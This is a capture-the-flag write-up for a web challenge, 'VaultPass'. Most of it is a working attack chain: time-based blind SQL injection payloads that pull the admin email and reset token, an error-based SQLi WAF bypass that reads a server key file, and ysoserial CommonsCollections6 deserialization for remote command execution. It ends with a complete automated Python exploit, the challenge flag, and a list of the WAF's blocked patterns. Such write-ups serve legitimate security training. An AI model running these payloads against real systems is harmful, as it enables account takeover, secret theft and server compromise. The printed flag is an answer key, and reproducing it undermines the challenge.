# VaultPass

| Field | Value |
|-------|-------|
| Category | Web |
| Points | 500 |

## Description

> VaultPass is an enterprise password manager used internally at ChConf.
> The dev team recently shipped a vault backup import feature.
> A security review flagged it as high risk, but it shipped anyway
> because "the encryption protects it."
>
> The source code of the import module has been leaked. The flag is on the server.
>
> Target: `http://<host>:8888`

## Solution

# VaultPass — CTF Writeup

**Flag:** `CHC{java_d3s3r1al_rce_thr0ugh_aes_k3y_l3ak_via_sqli_f1l3_r3ad}`

**Difficulty:** Hard
**Category:** Web / Java
**Stack:** Spring Boot 2.7.18 · Java 11 · PostgreSQL 15 · commons-collections 3.1

---

## Overview

VaultPass is an online password manager with three chained vulnerabilities:

1. **Time-based blind SQL injection** on the forgot-password endpoint — extract the admin's email and password-reset token character by character.
2. **Error-based SQL injection** on the profile page (with WAF bypass) — leak AES-128/CBC key and IV stored in a server-side config file.
3. **Java deserialization RCE** on the import endpoint — the decrypted backup is passed directly to `ObjectInputStream.readObject()` with no type filter, and `commons-collections 3.1` is on the classpath.

None of the three steps can be skipped:
- Steps 2 and 3 require an authenticated session — only obtainable by completing step 1.
- Step 3 requires the AES key/IV — only obtainable by completing step 2.
- The flag lives at a random path on the server — only findable via RCE.

---

## Reconnaissance

Browsing the application reveals four sections after login:

| Path | Description |
|------|-------------|
| `/dashboard` | Vault entries (admin has real-looking credentials stored here) |
| `/profile` | Change secondary email address |
| `/import` | Upload an encrypted vault backup |
| `/forgot-password` | Password reset (no auth required) |

All authenticated pages redirect to `/login` without a session. There is no registration endpoint.

The import page documents the backup format openly:

```
1. Serialize the vault record list as a Java object
2. Encrypt with AES/CBC/PKCS5Padding
3. Base64-encode the ciphertext
```

And notes that the decryption key is stored in the system configuration. This is the clearest hint toward the intended chain.

---

## Step 1 — Time-Based Blind SQL Injection → Login as Admin

### Finding the injection point

The forgot-password form (`POST /forgot-password`, parameter `email`) is publicly accessible. Submitting a normal email always returns the same generic message regardless of whether the address exists, so the response body is useless as an oracle.

However, submitting a payload that calls `pg_sleep()` reveals that the server-side query executes the injected SQL before returning:

```
email=x' OR (SELECT 1 FROM pg_sleep(3)) IS NOT NULL--
```

Response time jumps from ~30 ms to ~3 seconds. Confirmed blind SQLi.

> **Note:** The simpler form `' AND pg_sleep(3)--` does **not** work. `pg_sleep()` returns `void`, which PostgreSQL cannot evaluate as a boolean directly. Wrapping it in a subquery (`SELECT 1 FROM pg_sleep(N)`) makes the boolean coercion work.

Conditional timing (the basis for all extraction):

```
-- TRUE  → sleeps
x' OR (SELECT CASE WHEN (<condition>) THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NOT NULL--

-- FALSE → returns immediately
```

### Extracting the admin email

The vulnerable query is approximately:
```sql
SELECT id FROM users WHERE email = '<input>'
```

Extract the admin email character by character using `SUBSTRING`:

```
x' OR (SELECT CASE WHEN
  SUBSTRING((SELECT email FROM users WHERE is_admin=true LIMIT 1), <pos>, 1) = '<char>'
  THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NOT NULL--
```

Use a binary-search approach over printable ASCII to find each character efficiently. The full extraction script is at the bottom of this writeup.

Result: **`aziz@chconf.uz`**

### Triggering a reset token

Submit the real admin email to generate a token:

```bash
curl -s -X POST http://TARGET/forgot-password \
  --data-urlencode "email=aziz@chconf.uz"
```

The server creates a 64-character hex token in the `tokens` table (valid for 2 hours).

### Extracting the token

Extract the token the same way, reading from the `tokens` table:

```
x' OR (SELECT CASE WHEN
  SUBSTRING((SELECT token FROM tokens
             JOIN users ON tokens.user_id = users.id
             WHERE users.is_admin=true
             ORDER BY tokens.created_at DESC LIMIT 1), <pos>, 1) = '<char>'
  THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NOT NULL--
```

Tokens are hex (`[0-9a-f]`), so only 16 candidates per character — fast to enumerate.

### Resetting the admin password

```bash
curl -s -X POST "http://TARGET/reset-password?token=<TOKEN>" \
  --data-urlencode "newPassword=NewPass123" \
  --data-urlencode "confirmPassword=NewPass123"
```

### Logging in

```bash
curl -s -c cookies.txt -X POST http://TARGET/login \
  --data-urlencode "email=aziz@chconf.uz" \
  --data-urlencode "password=NewPass123"
# → HTTP 302 /dashboard
```

---

## Step 2 — Error-Based SQL Injection + WAF Bypass → Leak AES Key/IV

### Finding the injection point

The profile page (`POST /profile/secondary-email`, parameter `secondaryEmail`) is vulnerable to error-based SQLi. The server-side query is:

```sql
UPDATE users SET secondary_email = '<input>' WHERE id = <userId>
```

The full database error (including the value that caused the error) is returned to the user.

### The WAF

The endpoint has an anti-automation filter that blocks common SQLi patterns and crashes the server (HTTP 500) when any of these are detected in the input:

| Pattern | Blocked |
|---------|---------|
| `chr(` | Yes |
| `pg_read_file(` | Yes |
| `pg_sleep(` | Yes |
| `union` + `select` | Yes |
| `information_schema` | Yes |
| `extractvalue(` | Yes |
| `updatexml(` | Yes |
| `benchmark(` | Yes |
| `'abc'='abc'` boolean string pattern | Yes |
| `0x` + `concat` | Yes |
| `;` + `select`/`drop`/`insert`/`update`/`copy` | Yes |

**Not blocked:** `pg_read_binary_file(` and `convert_from(`.

### The payload

The `||` (string concatenation) operator forces PostgreSQL to evaluate the CAST expression before the UPDATE can proceed. When the CAST from text to integer fails, PostgreSQL includes the full text value in the error message.

```
' || CAST(convert_from(pg_read_binary_file('/web.ini'),'UTF8') AS INTEGER)--
```

`pg_read_file('/web.ini')` is blocked by the WAF. `pg_read_binary_file('/web.ini')` is not — and wrapping it in `convert_from(..., 'UTF8')` converts the raw bytes to text, making CAST possible.

### Sending the payload

```bash
curl -s -b cookies.txt \
  -X POST http://TARGET/profile/secondary-email \
  --data-urlencode "secondaryEmail=' || CAST(convert_from(pg_read_binary_file('/web.ini'),'UTF8') AS INTEGER)--"
```

### The leak

The error response contains:

```
Ma'lumotlar bazasi xatosi: ... ERROR: invalid input syntax for type integer:
"[vaultpass]
key=VjRhdWx0UGFzc0tleTEyMw==
iv=VjR1bHRJVjEyMzQ1Njc4IQ==
"
```

The values are **base64-encoded**. Decode them:

```python
from base64 import b64decode
key = b64decode("VjRhdWx0UGFzc0tleTEyMw==")  # → b'V4aultPassKey123'
iv  = b64decode("VjR1bHRJVjEyMzQ1Njc4IQ==")  # → b'V4ultIV12345678!'
```

---

## Step 3 — Java Deserialization RCE → Flag

### The vulnerability

`POST /import/passwords` decrypts the submitted base64 blob with the AES key/IV from `/web.ini`, then passes the decrypted bytes directly to `ObjectInputStream.readObject()` with no class filter:

```java
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decrypted));
Object imported = ois.readObject();
```

`commons-collections 3.1` is on the classpath. The **CommonsCollections6** gadget chain from ysoserial works on any JVM version.

### Step 3a — Generate the ysoserial payload

```bash
java \
  --add-opens java.base/java.util=ALL-UNNAMED \
  --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
  --add-opens java.base/java.lang=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections6 \
  "ls / > /vaultpass_uploads/ls.txt" \
  > payload.bin
```

> **Important:** The app container runs Alpine Linux with BusyBox `sh`. Shell operators like `>`, `|`, `;` are **not** interpreted when passed as a single string to `Runtime.exec()` — Java splits on whitespace and executes directly without a shell.
>
> Use `/bin/sh -c` explicitly:
> ```
> /bin/sh -c "ls / > /vaultpass_uploads/ls.txt"
> ```
> Or use simple commands that need no shell (`cp`, `cat`, etc.).

### Step 3b — Encrypt the payload

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from base64 import b64encode, b64decode

key = b64decode("VjRhdWx0UGFzc0tleTEyMw==")
iv  = b64decode("VjR1bHRJVjEyMzQ1Njc4IQ==")

data = open("payload.bin", "rb").read()
cipher = AES.new(key, AES.MODE_CBC, iv)
print(b64encode(cipher.encrypt(pad(data, 16))).decode())
```

### Step 3c — Send the payload

```bash
PAYLOAD=$(python3 encrypt.py)
curl -s -b cookies.txt \
  -X POST http://TARGET/import/passwords \
  --data-urlencode "importData=$PAYLOAD"
# → "Seyf zaxirasi muvaffaqiyatli import qilindi! 1 ta parol tiklandi."
```

A success message confirms deserialization (and command execution) happened.

### Step 3d — Find the flag

```bash
# Fetch the directory listing we wrote
curl -s http://TARGET/uploads/ls.txt
```

Output includes a file with an MD5-looking name. That is the flag:

```bash
# Second payload: copy flag to uploads
java ... -jar ysoserial-all.jar CommonsCollections6 \
  "cp /1e7e88d3a5c27aca348a7cd8025355a6.txt /vaultpass_uploads/flag.txt" \
  > payload2.bin

# Encrypt, send, fetch
python3 encrypt.py payload2.bin | xargs -I{} curl -s -b cookies.txt \
  -X POST http://TARGET/import/passwords --data-urlencode "importData={}"

curl -s http://TARGET/uploads/flag.txt
```

```
CHC{java_d3s3r1al_rce_thr0ugh_aes_k3y_l3ak_via_sqli_f1l3_r3ad}
```

---

## Full Automated Exploit

Save as `exploit.py`. Requires: `pycryptodome`, `requests`.

```python
#!/usr/bin/env python3
"""
VaultPass CTF — Full automated exploit
Chain: time-based blind SQLi → error-based SQLi + WAF bypass → Java deserialization RCE

Usage:
    python3 exploit.py http://TARGET:8888 /path/to/ysoserial-all.jar
"""

import sys, time, string, subprocess, requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from base64 import b64encode, b64decode

TARGET  = sys.argv[1].rstrip("/")
YSOJAR  = sys.argv[2]
SLEEP   = 2.5   # seconds — increase on slow/remote targets
THRESH  = 1.5   # decision threshold

s = requests.Session()

# ──────────────────────────────────────────────────────────────
# STEP 1 — Time-based blind SQLi on /forgot-password
# ──────────────────────────────────────────────────────────────

def timing_oracle(condition: str) -> bool:
    """Returns True if `condition` is true (server sleeps)."""
    payload = (
        f"x' OR (SELECT CASE WHEN ({condition})"
        f" THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END) IS NOT NULL--"
    )
    t0 = time.time()
    s.post(f"{TARGET}/forgot-password", data={"email": payload})
    return (time.time() - t0) > THRESH


def extract_string(query: str, max_len: int = 80, charset: str = None) -> str:
    """Extracts a string from the DB one character at a time using binary search."""
    if charset is None:
        charset = string.printable.strip()
    result = ""
    for pos in range(1, max_len + 1):
        # First check if there's a character at this position
        if not timing_oracle(
            f"LENGTH(({query})) >= {pos}"
        ):
            break
        # Binary search over charset
        lo, hi = 0, len(charset) - 1
        found = None
        while lo <= hi:
            mid = (lo + hi) // 2
            c = charset[mid]
            if timing_oracle(
                f"SUBSTRING(({query}),{pos},1) <= '{c}'"
            ):
                found = c
                hi = mid - 1
            else:
                lo = mid + 1
        if found is None:
            break
        result += found
        print(f"\r  [{pos:02d}] {result}", end="", flush=True)
    print()
    return result


print("[*] Step 1 — Time-based blind SQLi")

print("[+] Extracting admin email...")
ADMIN_EMAIL = extract_string(
    "SELECT email FROM users WHERE is_admin=true LIMIT 1",
    charset=string.ascii_lowercase + string.digits + "@.-_"
)
print(f"[+] Admin email: {ADMIN_EMAIL}")

print("[+] Triggering password reset for admin...")
s.post(f"{TARGET}/forgot-password", data={"email": ADMIN_EMAIL})

print("[+] Extracting reset token...")
TOKEN = extract_string(
    "SELECT token FROM tokens JOIN users ON tokens.user_id=users.id"
    " WHERE users.is_admin=true ORDER BY tokens.created_at DESC LIMIT 1",
    max_len=64,
    charset=string.hexdigits[:16]   # 0-9a-f
)
print(f"[+] Token: {TOKEN}")

NEW_PASSWORD = "Pwn3dByExploit!"
print(f"[+] Resetting admin password to: {NEW_PASSWORD}")
r = s.post(
    f"{TARGET}/reset-password",
    params={"token": TOKEN},
    data={"newPassword": NEW_PASSWORD, "confirmPassword": NEW_PASSWORD}
)
assert "muvaffaqiyatli" in r.text or r.status_code == 200, "Reset failed"

print("[+] Logging in as admin...")
r = s.post(
    f"{TARGET}/login",
    data={"email": ADMIN_EMAIL, "password": NEW_PASSWORD},
    allow_redirects=False
)
assert r.status_code == 302 and "/dashboard" in r.headers.get("Location",""), \
    f"Login failed: {r.status_code}"
print("[+] Authenticated.")

# ──────────────────────────────────────────────────────────────
# STEP 2 — Error-based SQLi + WAF bypass on /profile/secondary-email
# ──────────────────────────────────────────────────────────────

print("\n[*] Step 2 — Error-based SQLi (WAF bypass)")

SQLI_PAYLOAD = ("' || CAST(convert_from("
                "pg_read_binary_file('/web.ini'),'UTF8') AS INTEGER)--")

r = s.post(
    f"{TARGET}/profile/secondary-email",
    data={"secondaryEmail": SQLI_PAYLOAD}
)
assert r.status_code == 200, f"Unexpected status {r.status_code}"

import re, html
error_block = re.search(r'vp-error-pre[^>]*>(.*?)</pre>', r.text, re.DOTALL)
assert error_block, "Error block not found in response"
error_text = html.unescape(error_block.group(1))
print(f"[+] Raw error:\n{error_text[:300]}")

key_match = re.search(r'key=([A-Za-z0-9+/=]+)', error_text)
iv_match  = re.search(r'iv=([A-Za-z0-9+/=]+)',  error_text)
assert key_match and iv_match, "Could not parse key/iv from error"

AES_KEY = b64decode(key_match.group(1))
AES_IV  = b64decode(iv_match.group(1))
print(f"[+] AES key (b64): {key_match.group(1)}")
print(f"[+] AES iv  (b64): {iv_match.group(1)}")
print(f"[+] Decoded key:   {AES_KEY}")
print(f"[+] Decoded iv:    {AES_IV}")

# ──────────────────────────────────────────────────────────────
# STEP 3 — Java Deserialization RCE
# ──────────────────────────────────────────────────────────────

def make_encrypted_payload(command: str) -> str:
    """Generates a ysoserial CC6 payload, encrypts it with AES-128/CBC."""
    print(f"[+] Generating payload: {command}")
    res = subprocess.run(
        [
            "java",
            "--add-opens", "java.base/java.util=ALL-UNNAMED",
            "--add-opens", "java.base/java.lang.reflect=ALL-UNNAMED",
            "--add-opens", "java.base/java.lang=ALL-UNNAMED",
            "-jar", YSOJAR,
            "CommonsCollections6",
            command
        ],
        capture_output=True, check=True
    )
    raw = res.stdout
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return b64encode(cipher.encrypt(pad(raw, 16))).decode()


def send_payload(b64_payload: str) -> str:
    r = s.post(
        f"{TARGET}/import/passwords",
        data={"importData": b64_payload}
    )
    return r.text


print("\n[*] Step 3 — Java Deserialization RCE")

# 3a: List root directory to find the flag filename
print("[+] Listing / ...")
send_payload(make_encrypted_payload(
    "/bin/sh -c 'ls / > /vaultpass_uploads/ls.txt 2>&1'"
))
time.sleep(1)
ls_out = s.get(f"{TARGET}/uploads/ls.txt").text
print(f"[+] Root listing:\n{ls_out}")

flag_file = None
for line in ls_out.splitlines():
    line = line.strip()
    if re.match(r'^[0-9a-f]{32}\.txt$', line):
        flag_file = f"/{line}"
        break

assert flag_file, "Flag file not found in root listing"
print(f"[+] Flag file: {flag_file}")

# 3b: Copy flag to uploads
print("[+] Copying flag to /vaultpass_uploads/flag.txt ...")
send_payload(make_encrypted_payload(
    f"cp {flag_file} /vaultpass_uploads/flag.txt"
))
time.sleep(1)

flag = s.get(f"{TARGET}/uploads/flag.txt").text.strip()
print(f"\n{'='*60}")
print(f"FLAG: {flag}")
print(f"{'='*60}")
```

Run it:

```bash
python3 exploit.py http://TARGET:8888 ysoserial-all.jar
```

---

## Why Each Step Is Required

| Step skipped | Why it fails |
|---|---|
| Skip step 1, log in directly | No registration exists. jasur/nodira passwords are random. Only path in is password reset via SQLi. |
| Skip step 2, hardcode a key | Key and IV are only in `/web.ini` on the server. No other endpoint reveals them. |
| Skip step 3, try to read flag via SQLi | `pg_read_binary_file` runs on the DB container; the flag file is only on the app container. Container isolation prevents direct file read. |
| Use `pg_read_file` instead of bypass | WAF explicitly blocks `pg_read_file(` → HTTP 500. |
| Use `;` stacked queries in profile SQLi | WAF blocks `;` + `select`/`copy`/`table`/etc → HTTP 500. |
| Path traversal on `/uploads/` | Blocked at three layers: Tomcat encoded-slash rejection, Spring Security `StrictHttpFirewall`, Spring MVC routing. |

---

## Key Concepts

**PostgreSQL void/boolean** — `pg_sleep()` returns `void`, which cannot appear directly in a boolean expression. It must be wrapped: `(SELECT 1 FROM pg_sleep(N)) IS NOT NULL`.

**Error-based SQLi in UPDATE context** — `AND 1=CAST(...)` fails because the SET assignment evaluates `'value' AND ...` as a boolean, erroring on the string before CAST fires. The `||` concatenation operator forces CAST to execute as an expression.

**pg_read_binary_file vs pg_read_file** — Both require superuser. `pg_read_file` is explicitly blocked by the WAF. `pg_read_binary_file` returns `bytea`; wrapping it in `convert_from(..., 'UTF8')` makes it a text value usable in the CAST error-based technique.

**Java deserialization with AES gate** — The encryption requirement prevents blind spray-and-pray. The attacker must extract the key via the SQLi chain first — the two vulnerabilities are intentionally chained.

**Runtime.exec() vs shell** — Java's `Runtime.exec(String)` splits on whitespace and executes directly. Shell operators (`>`, `|`, `&&`) are not interpreted. Use `/bin/sh -c 'cmd'` for shell features, or use simple binary commands (`cp`, `cat`) that need no shell.


## Flag

`CHC{java_d3s3r1al_rce_thr0ugh_aes_k3y_l3ak_via_sqli_f1l3_r3ad}`
